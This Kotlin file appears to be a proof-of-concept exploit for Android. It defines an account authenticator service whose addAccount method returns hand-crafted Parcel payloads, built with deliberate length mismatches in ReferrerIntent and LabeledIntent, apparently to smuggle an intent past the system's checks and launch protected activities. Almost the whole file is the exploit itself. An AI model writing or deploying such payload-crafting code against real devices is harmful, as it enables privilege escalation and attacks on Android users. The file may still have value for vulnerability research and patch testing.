package play.ground

import android.accounts.AbstractAccountAuthenticator
import android.accounts.Account
import android.accounts.AccountAuthenticatorResponse
import android.accounts.AccountManager
import android.app.Service
import android.content.Intent
import android.content.pm.LabeledIntent
import android.os.Bundle
import android.os.Parcel
import android.util.Log
import androidx.core.os.bundleOf
import com.android.internal.content.ReferrerIntent
import org.jetbrains.anko.intentFor

class Authenticator : Service() {
  companion object {
    private const val TAG = "natsuki:s"
  }

  private val authenticator by lazy {
    object : AbstractAccountAuthenticator(this) {
      val taskId = 313

      fun referrerIntent(): ReferrerIntent {
        val payload = Parcel.obtain().apply {
          writeInt(fixme(72)) //  -> string length, patch later, binder.1
          // binder remain
          writeInt(2)
          writeInt(3)
          writeInt(4)
          writeInt(5)
          writeInt(6)

          writeString(null) // resultWho
          writeInt(0) // requestCode
          writeInt(0) // flags
          writeTypedObject(null, 0) // profiler info

          run {  // bundle
            writeInt(1) // typed object header
            writeInt(fixme(148)) // bundle back patch length (origin => 164)
            writeInt(Const.BundleMagic)  // "BNDL"
            writeInt(2)
            writeString("android.activity.launchTaskId") // key 1
            writeValue(taskId) // value 1
            writeString("_") // key 2
            run { // value 2
              writeInt(Const.ValByteArray)
              writeInt(fixme(56)) // byte array length (origin => 72)
              writeInt('@'.code) // 0
              writeInt(0) // String16 terminator and padding
            }
          }
        }
        payload.setDataPosition(0)
        val intent = intentFor<LoginActivity>().setType(payload.readString())
        return ReferrerIntent(intent, null)
      }


      fun labeledIntent(): LabeledIntent {
        val intent = Parcel.obtain().apply {
          intentFor<LoginActivity>().setAction("hello").writeToParcel(this, 0)
        }


        val tail = Parcel.obtain().apply {
          writeString(null) // mSourcePackage => resolvedType
          writeInt(0) // labelRes  => hdr

          writeInt(0) // kind1 => flags
          writeString8("AAA") // text => binder
          writeInt(11) // alignment => cookie.1
          run {
            writeInt(fixme(63)) // span text len => cookie.2

            // we don't have a valid type ( sb*| sh* ), so no representation is read
            // writeInt(65)  // p.12 => representation

            writeString(null) //  p.34 => resultWho(null)
            writeInt(77) // p.56 => requestCode
            writeInt(88) // p.78 => flags
            writeInt(0) // p.90 => profilerInfo(null)
            run {
              writeInt(1) // options != null

              writeInt(fixme(172)) // back patch length
              writeInt(Const.BundleMagic) // 'B' 'N' 'D' 'L'

              writeInt(2) // entry count
              writeString("android.activity.launchTaskId") // key 1
              writeValue(taskId) // value 1
              writeString("_") // key 2
              run {  // value 2
                writeInt(Const.ValByteArray) // VAL_BYTEARRAY
                writeInt(fixme(80)) // byte array length
                writeInt('@'.code) //  0
                writeInt(0)
              }
            }

            writeInt(1) // span.start
            writeInt(2) // span.end
            writeInt(3) // span.flags
            writeInt(0) // end flag
          }
          writeInt(0) // Icon
        }

        val labeled = Parcel.obtain().apply {
          appendFrom(intent, 0, intent.dataSize())
          appendFrom(tail, 0, tail.dataSize())
        }

        labeled.setDataPosition(0)
        return LabeledIntent.CREATOR.createFromParcel(labeled)
      }


      override fun addAccount(
        response: AccountAuthenticatorResponse?,
        accountType: String?,
        authTokenType: String?,
        requiredFeatures: Array<out String>?,
        options: Bundle?
      ): Bundle {
        Log.d(
          TAG,
          "addAccount() called with: response = $response, accountType = $accountType, authTokenType = $authTokenType, requiredFeatures = $requiredFeatures, options = $options"
        )

        val intent = referrerIntent()
        return bundleOf(AccountManager.KEY_INTENT to intent)
      }


      override fun editProperties(response: AccountAuthenticatorResponse?, accountType: String?) =
        TODO()


      override fun confirmCredentials(
        response: AccountAuthenticatorResponse?, account: Account?, options: Bundle?
      ) = TODO()

      override fun getAuthToken(
        response: AccountAuthenticatorResponse?,
        account: Account?,
        authTokenType: String?,
        options: Bundle?
      ) = TODO()

      override fun getAuthTokenLabel(authTokenType: String?) = TODO()

      override fun updateCredentials(
        response: AccountAuthenticatorResponse?,
        account: Account?,
        authTokenType: String?,
        options: Bundle?
      ) = TODO()

      override fun hasFeatures(
        response: AccountAuthenticatorResponse?, account: Account?, features: Array<out String>?
      ) = TODO()

    }
  }

  override fun onBind(intent: Intent?) = authenticator.iBinder!!

}
